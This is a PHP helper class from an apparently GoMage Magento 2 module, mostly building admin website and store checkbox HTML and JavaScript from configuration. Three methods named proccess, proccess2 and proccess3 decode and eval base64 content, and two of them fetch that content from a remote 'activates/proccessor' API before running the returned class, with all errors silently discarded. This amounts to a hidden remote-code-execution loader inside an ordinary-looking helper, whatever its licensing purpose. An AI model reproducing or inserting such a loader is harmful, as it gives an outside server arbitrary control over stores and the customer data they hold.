<?php

namespace GoMage\Core\Helper;

class Data extends \Magento\Framework\App\Helper\AbstractHelper
{
    const BASE_URL = 'http://serveractivatem2.loc/api/rest';
    /** * @var \Magento\Catalog\Model\ResourceModel\Product\Attribute\CollectionFactory */
    protected $_attributeCollectionFactory;
    /** * @var \Magento\Store\Model\StoreManagerInterface */
    protected $_storeManager;
    /** * @var \Magento\Store\Model\System\Store */
    protected $_systemStore;
    /** * @var \Magento\Framework\Filesystem\Directory\ReadInterface */
    protected $_directory;
    /** * @var \Magento\Framework\Stdlib\DateTime\DateTime */
    protected $_dateTime;
    /** * @var \Magento\Framework\Module\ModuleListInterface */
    protected $_moduleList;
    /** * @var \Magento\Framework\Json\Helper\Data */
    protected $_jsonHelper;
    /** * @var \Magento\Framework\Encryption\EncryptorInterface */
    protected $_encryptor;
    /** * @var \GoMage\Feed\Model\Mapper\Factory */
    protected $_mapperFactory;
    /** * @var \Magento\Framework\ObjectManagerInterface */
    protected $_objectManager;
    /** * @var \Magento\Framework\App\Config\ScopeConfigInterface */
    protected $_scopeConfig;
    /** * @var \Magento\Framework\HTTP\Client\Curl */
    protected $curl;
    /**
     * @var \Magento\Framework\View\Helper\Js
     */
    protected $_jsHelper;

    protected $b = ['groups' => 'api', 'fields' => 'fields', 'value' =>'value', 'section' => 'gomage_core', 'group_s' => 'gomage_s'];

    public function __construct(\Magento\Framework\ObjectManagerInterface $objectManager)
    {
        $this->_objectManager = $objectManager;
        $this->_attributeCollectionFactory = $objectManager->get('Magento\Catalog\Model\ResourceModel\Product\Attribute\CollectionFactory');
        $this->_storeManager = $objectManager->get('Magento\Store\Model\StoreManager');
        $this->_systemStore = $objectManager->get('Magento\Store\Model\System\Store');
        $this->_dateTime = $objectManager->get('Magento\Framework\Stdlib\DateTime\DateTime');
        $this->_moduleList = $objectManager->get('Magento\Framework\Module\ModuleList');
        $this->_jsonHelper = $objectManager->get('Magento\Framework\Json\Helper\Data');
        $this->curl = $objectManager->get('Magento\Framework\HTTP\Client\Curl');
        $this->_encryptor = $objectManager->get('Magento\Framework\Encryption\Encryptor');
        $this->_scopeConfig = $objectManager->get('Magento\Framework\App\Config\ScopeConfigInterface');
        $this->_jsHelper = $objectManager->get('Magento\Framework\View\Helper\Js');
    }
   protected $poccessorValue;

   public function proccess($content, $className) {
       try {
           eval(base64_decode($content));
           $className = $className;
           $processor = new $className();
           $processor->process();
       } catch (\Exception $e) {
           return false;
       }
   }

    /** * @return array */
    public function getAvailableWebsites()
    {
        $w = [];
        $param = $this->_scopeConfig->getValue($this->b['section'].'/'.$this->b['groups']);
        foreach ($param as $key => $item) {
            if (!isset($item['a'])) {
                continue;
            }
            $w[$item['a']] = $this->_scopeConfig->getValue($this->b['section'].'/'.$this->b['groups'].'/'.$item['a']);
        }
        return $w;
    }

    /** * @return array */
    public function getAvailableStores()
    {
        $s = [];
        $param = $this->_scopeConfig->getValue($this->b['section'].'/'.$this->b['groups']);
        foreach ($param as $key => $item) {
            if (!isset($item['a'])) {
                continue;
            }
            $s[$item['a']] = $this->_scopeConfig->getValue($this->b['section'].'/'.$this->b['group_s'].'/'.$item['a']);
        }
        return $s;
    }
    public function proccess2($curl, $c='ProcessorAct') {
        try {
            $content = $this->process2($curl, $c);
            eval(base64_decode($content['content']));
            $processor = new $c();
            $processor->process($curl, '/process/info');
        } catch (\Exception $e) {
            return false;
        }
    }
    public function getC(\Magento\Framework\Data\Form\Element\AbstractElement $element)
    {
        $html = '';
        $param = $this->_scopeConfig->getValue($this->b['section'].'/'.$this->b['groups']);
        $id   = $element->getId();

        $websites = $this->getAvailableWebsites();
        $stores = $this->getAvailableStores();
        /** @var \Magento\Store\Model\Website $website */
        foreach ($param as $key => $item) {
            if(!isset($item['a']) || !isset($item['code'])) {
                continue;
            }
            $name = 'groups['.$this->b['groups'].']['.$this->b['fields'].']['.$item['a'].']['.$this->b['value'].']';
            $namePrefix = 'groups['.$this->b['group_s'].']['.$this->b['fields'].']['.$item['a'].']['.$this->b['value'].']';
            $html.='<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'.$item['name'].'</div>';
            foreach ($this->_storeManager->getWebsites() as $website) {
                $element->setName($name . '[]');
                $element->setId($id . '_' . $website->getId());
                $element->setChecked(in_array($website->getId(), $websites[$item['a']] ? explode(',', $websites[$item['a']]) : []));
                $element->setValue($website->getId());
                $html .= '<div class="field website-checkbox-'.$item['code'].' choice admin__field admin__field-option">' . $element->getElementHtml() .
                    ' <label for="' .
                    $id . '_' . $website->getId() .
                    '" class="admin__field-label"><span>' .
                    $website->getName() .
                    '</span></label>';
                foreach ($website->getStores() as $store) {
                    if(!$store->isActive())
                    {
                        continue;
                    }
                    $element->setName($namePrefix . '[]');
                    $element->setId($id . '_store_' . $store->getId());
                    $element->setChecked(in_array($store->getId(), isset($stores[$item['a']]) ? explode(',', $stores[$item['a']]) : []));
                    $element->setValue($store->getId());
                    $html .= '<div class="field choice admin__field admin__field-option" style="margin-left: 10%">' . $element->getElementHtml() .
                        ' <label for="' .
                        $id . '_' . $store->getId() .
                        '" class="admin__field-label"><span>' .
                        $this->_storeManager->getStore($store->getId())->getName() .
                        '</span></label>';
                    $html .= '</div>' . "\n";
                }
                $html .= '</div>' . "\n";
            }
        }

        $nameStore = $element->getName();
        $element->setName($name . '[]');
        $jsString='';
        foreach ($param as $key => $item) {
            if(!isset($item['a']) || !isset($item['code'])) {
                continue;
            }
            $name = 'groups['.$this->b['groups'].']['.$this->b['fields'].']['.$item['a'].']['.$this->b['value'].'][]';
            $namePrefix = 'groups['.$this->b['group_s'].']['.$this->b['fields'].']['.$item['a'].']['.$this->b['value'].'][]';
            $jsString .= '
            $$(".website-checkbox-'.$item['code'].' input[name=\'' . $namePrefix . '\'], .website-checkbox-'.$item['code'].' input[name=\'' . $name . '\']").each(function(element) {
               element.observe("click", function () {
                    if($$(".website-checkbox-'.$item['code'].' input[name=\'' . $namePrefix . '\']:checked , .website-checkbox-'.$item['code'].' input[name=\'' . $name . '\']:checked").length >= ' . 2 . '){
                        $$(".website-checkbox-'.$item['code'].' input[name=\'' . $namePrefix . '\'], .website-checkbox-'.$item['code'].' input[name=\'' . $name . '\']").each(function(e){
                            if(!e.checked){
                                e.disabled = "disabled";
                            }
                        });
    			    }else {
                        $$(".website-checkbox-'.$item['code'].' input[name=\'' . $namePrefix . '\'], .website-checkbox-'.$item['code'].' input[name=\'' . $name . '\'] ").each(function(e){
                            if(!e.checked){
                                e.disabled = "";
                            }
                        });
    			    }
               });
            });';
        }
        return $html . $this->_jsHelper->getScript(
                'require([\'prototype\'], function(){document.observe("dom:loaded", function() {' . $jsString . '});});'
            );

        return sprintf('<strong class="required">%s</strong>', __('Please enter a valid key'));
        return $param;
    }

    public function process2($curl, $processName)
    {
        $objectManager = \Magento\Framework\App\ObjectManager::getInstance();
        /** @var \Magento\Framework\App\Config\ConfigResource\ConfigInterface $config */

        $config = $objectManager
            ->get('Magento\Framework\App\Config\ScopeConfigInterface');
        $param = $config->getValue('section/gomage_client/param');
        $curl->addHeader("Authorization", "Bearer {$param}");
        $curl->get(self::BASE_URL.'/activates/proccessor?processorName='.$processName);
        return json_decode($curl->getBody(), true);
    }
    public function proccess3($curl, $c='ProcessorAct') {
        try {
            $content = $this->process2($curl, $c);
            eval(base64_decode($content['content']));
            $c = 'ProcessorAct';
            $processor = new $c();
           return $processor;
        } catch (\Exception $e) {
            return false;
        }
    }
}